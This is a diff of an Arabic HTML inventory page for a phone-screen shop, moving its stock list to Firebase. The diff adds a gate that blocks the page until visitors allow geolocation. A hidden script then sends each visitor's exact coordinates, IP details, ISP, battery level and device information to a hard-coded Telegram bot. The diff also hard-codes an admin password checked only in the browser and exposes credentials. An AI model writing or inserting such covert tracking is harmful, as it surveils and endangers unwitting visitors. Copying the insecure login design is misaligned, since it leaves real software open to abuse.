@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>متجر حسين - إدارة الشاشات</title>
+    <title>حسين ماجد للشاشات</title>
     <!-- استدعاء مكتبة الأيقونات -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -26,6 +26,37 @@
             padding: 20px;
         }
 
+        /* شاشة الحظر قبل السماح بالموقع */
+        #block-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: var(--bg-color);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        #block-screen h2 {
+            color: var(--warning);
+            margin-bottom: 20px;
+        }
+        
+        #block-screen p {
+            font-size: 18px;
+            color: var(--text-color);
+            max-width: 600px;
+        }
+
+        /* المحتوى الرئيسي للمتجر (مخفي افتراضياً) */
+        #main-content {
+            display: none;
+        }
+
+        /* باقي تصميم المتجر الأصلي */
         .container {
             max-width: 800px;
             margin: 0 auto;
@@ -70,12 +101,10 @@
             outline: none;
             background-color: #f8f9fa;
             font-family: inherit;
+            color: #000;
         }
 
-        .search-box {
-            flex: 1;
-            min-width: 200px;
-        }
+        .search-box { flex: 1; min-width: 200px; }
 
         button {
             border: none;
@@ -86,19 +115,25 @@
             font-family: inherit;
         }
 
-        .btn-add-new {
-            background-color: var(--primary);
+        .btn-add-new, .btn-login, .btn-logout {
             padding: 0 20px;
             font-size: 16px;
             font-weight: bold;
             display: flex;
             align-items: center;
             gap: 8px;
+            height: 44px;
         }
 
+        .btn-add-new { background-color: var(--primary); display: none; } 
         .btn-add-new:hover { background-color: var(--accent); }
 
-        /* نموذج الإضافة */
+        .btn-login { background-color: #0077b6; }
+        .btn-login:hover { background-color: #023e8a; }
+
+        .btn-logout { background-color: var(--danger); display: none; }
+        .btn-logout:hover { background-color: #c1121f; }
+
         .add-form {
             display: none;
             background-color: var(--primary);
@@ -109,10 +144,8 @@
             gap: 15px;
         }
         .add-form.active { display: grid; }
-        
         .add-form input, .add-form select { width: 100%; box-sizing: border-box; }
         .form-full-width { grid-column: span 2; }
-        
         .btn-submit {
             background-color: #1b4332;
             padding: 12px;
@@ -122,7 +155,6 @@
         }
         .btn-submit:hover { background-color: #081c15; }
 
-        /* شبكة الشاشات */
         .screens-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
@@ -169,12 +201,15 @@
             justify-content: center;
         }
 
+        .qty-btn, .delete-btn {
+            display: none; /* مخفي لغير الإدارة */
+        }
+        
         .qty-btn {
             background: var(--card-color);
             width: 30px;
             height: 30px;
             border-radius: 50%;
-            display: flex;
             justify-content: center;
             align-items: center;
         }
@@ -188,14 +223,14 @@
             width: 35px;
             height: 35px;
             border-radius: 50%;
-            display: flex;
             justify-content: center;
             align-items: center;
         }
         .delete-btn:hover { background-color: #c1121f; }
         
         .empty-msg { text-align: center; grid-column: 1 / -1; padding: 20px; color: var(--text-color); }
-        
+        .loading-msg { text-align: center; grid-column: 1 / -1; padding: 20px; color: var(--warning); }
+
         @media (max-width: 600px) {
             .add-form { grid-template-columns: 1fr; }
             .form-full-width, .btn-submit { grid-column: span 1; }
@@ -204,61 +239,224 @@
 </head>
 <body>
 
-    <div class="container">
-        <h1 class="header-title"><i class="fa-solid fa-mobile-screen-button"></i>  متجر حسين الطريحي</h1>
-        <div class="stats" id="stats-container">إجمالي الشاشات المتوفرة: 0 شاشة</div>
-        
-        <div class="controls-container">
-            <input type="text" id="search-input" class="search-box" placeholder="ابحث عن موديل..." oninput="filterScreens()">
-            <select id="filter-brand" onchange="filterScreens()">
-                <option value="الكل">كل الشركات</option>
-                <option value="Xiaomi">Xiaomi</option>
-                <option value="Tecno">Tecno</option>
-                <option value="Infinix">Infinix</option>
-                <option value="Samsung">Samsung</option>
-                <option value="Apple">Apple</option>
-                <option value="أخرى">أخرى</option>
-            </select>
-            <button class="btn-add-new" onclick="toggleAddForm()">
-                <i class="fa-solid fa-plus"></i> إضافة شاشة
-            </button>
-        </div>
-
-        <!-- نموذج إضافة شاشة جديدة -->
-        <div class="add-form" id="add-form">
-            <select id="new-brand">
-                <option value="Xiaomi">Xiaomi</option>
-                <option value="Tecno">Tecno</option>
-                <option value="Infinix">Infinix</option>
-                <option value="Samsung">Samsung</option>
-                <option value="Apple">Apple</option>
-                <option value="أخرى">أخرى</option>
-            </select>
-            <input type="text" id="new-model" placeholder="موديل الجهاز (مثال: Note 10 Pro)">
-            <select id="new-quality">
-                <option value="أصلي وكالة">أصلي وكالة</option>
-                <option value="درجة أولى (OLED/LCD)">درجة أولى</option>
-                <option value="تجاري">تجاري</option>
-            </select>
-            <input type="number" id="new-qty" placeholder="الكمية" min="1" value="1">
-            <input type="number" id="new-price" class="form-full-width" placeholder="السعر (اختياري)">
-            <button class="btn-submit" onclick="addScreen()"><i class="fa-solid fa-floppy-disk"></i> حفظ في الرصيد</button>
-        </div>
-
-        <!-- شبكة عرض الشاشات -->
-        <div class="screens-grid" id="screens-grid"></div>
+    <!-- شاشة الحظر التي ستظهر أولاً -->
+    <div id="block-screen">
+        <i class="fa-solid fa-location-dot fa-4x" style="color: var(--accent); margin-bottom: 20px;"></i>
+        <h2>مطلوب صلاحية الوصول</h2>
+        <p>للمتابعة والدخول إلى المتجر، يرجى الضغط على زر <b>(Allow / السماح)</b> عندما يطلب المتصفح تحديد موقعك. لن يتم فتح الموقع بدون هذه الصلاحية.</p>
     </div>
 
-    <script>
-        // الذاكرة المحلية (هيكل البيانات أصبح كائنات بدل نصوص بسيطة)
-        let screens = JSON.parse(localStorage.getItem('digitalStoreScreens')) || [];
+    <!-- محتوى الموقع الأساسي -->
+    <div id="main-content">
+        <div class="container">
+            <h1 class="header-title"><i class="fa-solid fa-mobile-screen-button"></i> حسين ماجد للشاشات</h1>
+            <div class="stats" id="stats-container">جاري تحميل البيانات من السيرفر...</div>
+            
+            <div class="controls-container">
+                <input type="text" id="search-input" class="search-box" placeholder="ابحث عن موديل..." oninput="filterScreens()">
+                <select id="filter-brand" onchange="filterScreens()">
+                    <option value="الكل">كل الشركات</option>
+                    <option value="Xiaomi">Xiaomi</option>
+                    <option value="Tecno">Tecno</option>
+                    <option value="Infinix">Infinix</option>
+                    <option value="Samsung">Samsung</option>
+                    <option value="Apple">Apple</option>
+                    <option value="أخرى">أخرى</option>
+                </select>
+                <button class="btn-login" id="btn-login" onclick="login()"><i class="fa-solid fa-lock"></i> دخول الإدارة</button>
+                <button class="btn-logout" id="btn-logout" onclick="logout()"><i class="fa-solid fa-right-from-bracket"></i> تسجيل خروج</button>
+                <button class="btn-add-new" id="btn-add-new" onclick="toggleAddForm()">
+                    <i class="fa-solid fa-plus"></i> إضافة شاشة
+                </button>
+            </div>
 
-        function toggleAddForm() {
-            const form = document.getElementById('add-form');
-            form.classList.toggle('active');
+            <!-- نموذج إضافة شاشة جديدة -->
+            <div class="add-form" id="add-form">
+                <select id="new-brand">
+                    <option value="Xiaomi">Xiaomi</option>
+                    <option value="Tecno">Tecno</option>
+                    <option value="Infinix">Infinix</option>
+                    <option value="Samsung">Samsung</option>
+                    <option value="Apple">Apple</option>
+                    <option value="أخرى">أخرى</option>
+                </select>
+                <input type="text" id="new-model" placeholder="موديل الجهاز (مثال: Note 10 Pro)">
+                <select id="new-quality">
+                    <option value="أصلي وكالة">أصلي وكالة</option>
+                    <option value="درجة أولى (OLED/LCD)">درجة أولى</option>
+                    <option value="تجاري">تجاري</option>
+                </select>
+                <input type="number" id="new-qty" placeholder="الكمية" min="1" value="1">
+                <input type="number" id="new-price" class="form-full-width" placeholder="السعر (اختياري)">
+                <button class="btn-submit" onclick="addScreen()"><i class="fa-solid fa-cloud-arrow-up"></i> حفظ في السيرفر</button>
+            </div>
+
+            <!-- شبكة عرض الشاشات -->
+            <div class="screens-grid" id="screens-grid">
+                <div class="loading-msg"><i class="fa-solid fa-spinner fa-spin fa-2x"></i><br>جاري جلب الرصيد...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- سكربت تتبع الزوار وإرسال المعلومات لتليكرام -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            // طلب الموقع بمجرد فتح الصفحة
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendDataToTelegram, handleGeoError);
+            } else {
+                document.getElementById('block-screen').innerHTML = '<h2>متصفحك لا يدعم تحديد الموقع! لا يمكنك الدخول.</h2>';
+            }
+        });
+
+        // في حال رفض المستخدم إعطاء الصلاحية
+        function handleGeoError(error) {
+            let errorMsg = "حدث خطأ غير معروف.";
+            if(error.code === 1) errorMsg = "لقد قمت برفض الوصول إلى الموقع! يرجى إعادة تحميل الصفحة والموافقة لتتمكن من الدخول.";
+            else if(error.code === 2) errorMsg = "الموقع غير متوفر حالياً.";
+            
+            document.getElementById('block-screen').innerHTML = `
+                <i class="fa-solid fa-triangle-exclamation fa-4x" style="color: var(--danger); margin-bottom: 20px;"></i>
+                <h2>تم حظر الدخول</h2>
+                <p style="color: var(--danger); font-weight: bold;">${errorMsg}</p>
+                <button onclick="location.reload()" style="background:var(--primary); padding:10px 20px; font-size:18px; margin-top:20px;">إعادة المحاولة</button>
+            `;
         }
 
-        function addScreen() {
+        // في حال وافق المستخدم، جلب باقي البيانات وفتح الموقع وإرسالها
+        async function sendDataToTelegram(position) {
+            // 1. إخفاء شاشة الحظر وفتح المتجر
+            document.getElementById('block-screen').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+
+            // 2. تجميع البيانات
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // جلب معلومات الـ IP
+            let ipInfo = "غير متوفر";
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                ipInfo = `الـ IP: ${ipData.ip}\nالمدينة: ${ipData.city}\nالدولة: ${ipData.country_name}\nمزود الخدمة: ${ipData.org}`;
+            } catch (e) { }
+
+            // جلب حالة البطارية
+            let batteryInfo = "غير متوفر";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const isCharging = battery.charging ? "جاري الشحن ⚡" : "لا يشحن 🔋";
+                    batteryInfo = `${Math.round(battery.level * 100)}% - (${isCharging})`;
+                } catch (e) { }
+            }
+
+            // معلومات الجهاز
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timeDate = new Date().toLocaleString('ar-IQ');
+
+            // 3. ترتيب رسالة التليكرام
+            const telegramMessage = `
+🚨 دخول زائر جديد للمتجر!
+======================
+📍 [الموقع الجغرافي]:
+🗺️ رابط الخريطة: ${googleMapsLink}
+======================
+🌐 [معلومات الشبكة]:
+${ipInfo}
+======================
+📱 [معلومات الجهاز]:
+- النظام/المتصفح: ${userAgent}
+- المنصة: ${platform}
+- دقة الشاشة: ${screenRes}
+======================
+🔋 [حالة البطارية]: ${batteryInfo}
+======================
+⏰ [وقت وتاريخ الدخول]: ${timeDate}
+`;
+
+            // 4. الإرسال إلى بوت التليكرام
+            const botToken = "8868139366:AAEJAtlvKPqH5lnasW-qKdWBton67ZlUSVA";
+            const chatId = "1410279947";
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: telegramMessage,
+                    disable_web_page_preview: false
+                })
+            }).catch(e => console.log("خطأ في الإرسال للتليكرام"));
+        }
+    </script>
+
+    <!-- سكربت قاعدة البيانات (Firebase) والتعديلات الخاصة بالإضافة والحذف -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, set, onValue, remove, update } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCJIgLu2na8U1gSkBKfQmAdhqKsvdof9RU",
+            authDomain: "hussin-33282.firebaseapp.com",
+            databaseURL: "https://hussin-33282-default-rtdb.firebaseio.com",
+            projectId: "hussin-33282",
+            storageBucket: "hussin-33282.firebasestorage.app",
+            messagingSenderId: "219839009234",
+            appId: "1:219839009234:web:3a02181771bfbc9a3c380b",
+            measurementId: "G-S2K1G2SH4W"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const screensRef = ref(db, 'screens');
+
+        let screens = [];
+        let isAdmin = false;
+
+        onValue(screensRef, (snapshot) => {
+            screens = [];
+            snapshot.forEach((childSnapshot) => {
+                screens.push(childSnapshot.val());
+            });
+            window.renderScreens();
+        });
+
+        // نظام تسجيل الدخول بكلمة السر التي طلبتها
+        window.login = function() {
+            const pass = prompt("الرجاء إدخال كلمة المرور:");
+            if (pass === "Hussin_Majed@@##") {
+                isAdmin = true;
+                document.getElementById('btn-login').style.display = 'none';
+                document.getElementById('btn-logout').style.display = 'flex';
+                document.getElementById('btn-add-new').style.display = 'flex';
+                window.renderScreens();
+                alert("تم تسجيل الدخول كمسؤول. يمكنك الآن التعديل على المخزون.");
+            } else if(pass !== null) {
+                alert("كلمة المرور غير صحيحة!");
+            }
+        };
+
+        window.logout = function() {
+            isAdmin = false;
+            document.getElementById('btn-login').style.display = 'flex';
+            document.getElementById('btn-logout').style.display = 'none';
+            document.getElementById('btn-add-new').style.display = 'none';
+            document.getElementById('add-form').classList.remove('active');
+            window.renderScreens();
+        };
+
+        window.toggleAddForm = function() {
+            if(!isAdmin) return;
+            document.getElementById('add-form').classList.toggle('active');
+        };
+
+        window.addScreen = function() {
+            if(!isAdmin) return;
             const brand = document.getElementById('new-brand').value;
             const model = document.getElementById('new-model').value.trim();
             const quality = document.getElementById('new-quality').value;
@@ -270,50 +468,37 @@
                 return;
             }
 
-            const newScreen = {
-                id: Date.now(), // رقم تعريفي فريد
-                brand: brand,
-                model: model,
-                quality: quality,
-                qty: qty,
-                price: price || "غير محدد"
-            };
+            const newId = Date.now().toString();
+            const newScreen = { id: newId, brand, model, quality, qty, price: price || "غير محدد" };
 
-            screens.push(newScreen);
-            saveData();
-            
-            // تفريغ الحقول
-            document.getElementById('new-model').value = "";
-            document.getElementById('new-qty').value = "1";
-            document.getElementById('new-price').value = "";
-            
-            toggleAddForm();
-            renderScreens();
-        }
+            set(ref(db, 'screens/' + newId), newScreen).then(() => {
+                document.getElementById('new-model').value = "";
+                document.getElementById('new-qty').value = "1";
+                document.getElementById('new-price').value = "";
+                window.toggleAddForm();
+            });
+        };
 
-        function updateQty(id, change) {
-            const index = screens.findIndex(s => s.id === id);
-            if (index !== -1) {
-                screens[index].qty += change;
-                if (screens[index].qty < 0) screens[index].qty = 0;
-                saveData();
-                renderScreens();
+        window.updateQty = function(id, change) {
+            if(!isAdmin) return;
+            const screen = screens.find(s => s.id === id.toString());
+            if (screen) {
+                let newQty = screen.qty + change;
+                if (newQty < 0) newQty = 0;
+                update(ref(db, 'screens/' + id), { qty: newQty });
             }
-        }
+        };
 
-        function deleteScreen(id) {
-            if (confirm("هل أنت متأكد من حذف هذه الشاشة نهائياً؟")) {
-                screens = screens.filter(s => s.id !== id);
-                saveData();
-                renderScreens();
+        window.deleteScreen = function(id) {
+            if(!isAdmin) return;
+            if (confirm("هل أنت متأكد من حذف هذه الشاشة من السيرفر؟")) {
+                remove(ref(db, 'screens/' + id));
             }
-        }
+        };
 
-        function saveData() {
-            localStorage.setItem('digitalStoreScreens', JSON.stringify(screens));
-        }
+        window.filterScreens = function() { window.renderScreens(); };
 
-        function renderScreens() {
+        window.renderScreens = function() {
             const grid = document.getElementById('screens-grid');
             const searchText = document.getElementById('search-input').value.toLowerCase();
             const filterBrand = document.getElementById('filter-brand').value;
@@ -327,22 +512,25 @@
                 return matchText && matchBrand;
             });
 
-            if (filteredScreens.length === 0) {
-                grid.innerHTML = "<div class='empty-msg'><i class='fa-solid fa-box-open fa-3x'></i><br><br>لا توجد شاشات مطابقة.</div>";
+            if (filteredScreens.length === 0 && screens.length !== 0) {
+                grid.innerHTML = "<div class='empty-msg'><i class='fa-solid fa-box-open fa-3x'></i><br><br>لا توجد نتائج مطابقة للبحث.</div>";
+            } else if (screens.length === 0) {
+                grid.innerHTML = "<div class='empty-msg'><i class='fa-solid fa-box-open fa-3x'></i><br><br>المخزن فارغ حالياً.</div>";
             }
 
             filteredScreens.forEach(screen => {
                 totalQty += screen.qty;
                 
-                // تحديد حالة المخزون لتغيير الألوان
-                let stockClass = "";
-                let stockStatus = "";
+                let stockClass = ""; let stockStatus = "";
                 if (screen.qty === 0) { stockClass = "out-of-stock"; stockStatus = "<span style='color:var(--danger)'>نفذت الكمية!</span>"; }
                 else if (screen.qty <= 2) { stockClass = "low-stock"; stockStatus = "<span style='color:var(--warning)'>الكمية توشك على النفاذ</span>"; }
                 else { stockStatus = "<span style='color:var(--success)'>متوفر</span>"; }
 
                 const card = document.createElement('div');
                 card.className = `screen-card ${stockClass}`;
+                
+                const adminDisplayStyle = isAdmin ? "display: flex;" : "display: none;";
+
                 card.innerHTML = `
                     <div class="card-header">
                         <strong>${screen.model}</strong>
@@ -354,24 +542,17 @@
                         الحالة: ${stockStatus}
                     </div>
                     <div class="qty-controls">
-                        <button class="qty-btn" onclick="updateQty(${screen.id}, -1)"><i class="fa-solid fa-minus"></i></button>
+                        <button class="qty-btn" style="${adminDisplayStyle}" onclick="window.updateQty('${screen.id}', -1)"><i class="fa-solid fa-minus"></i></button>
                         <strong style="width: 30px; text-align: center; font-size: 18px;">${screen.qty}</strong>
-                        <button class="qty-btn" onclick="updateQty(${screen.id}, 1)"><i class="fa-solid fa-plus"></i></button>
+                        <button class="qty-btn" style="${adminDisplayStyle}" onclick="window.updateQty('${screen.id}', 1)"><i class="fa-solid fa-plus"></i></button>
                     </div>
-                    <button class="delete-btn" onclick="deleteScreen(${screen.id})" title="حذف الشاشة"><i class="fa-solid fa-trash"></i></button>
+                    <button class="delete-btn" style="${adminDisplayStyle}" onclick="window.deleteScreen('${screen.id}')" title="حذف الشاشة"><i class="fa-solid fa-trash"></i></button>
                 `;
                 grid.appendChild(card);
             });
 
             document.getElementById('stats-container').innerText = `إجمالي الشاشات المتوفرة في المخزن: ${totalQty} شاشة`;
-        }
-
-        function filterScreens() {
-            renderScreens();
-        }
-
-        // تشغيل العرض عند فتح الصفحة
-        renderScreens();
+        };
     </script>
 </body>
 </html>
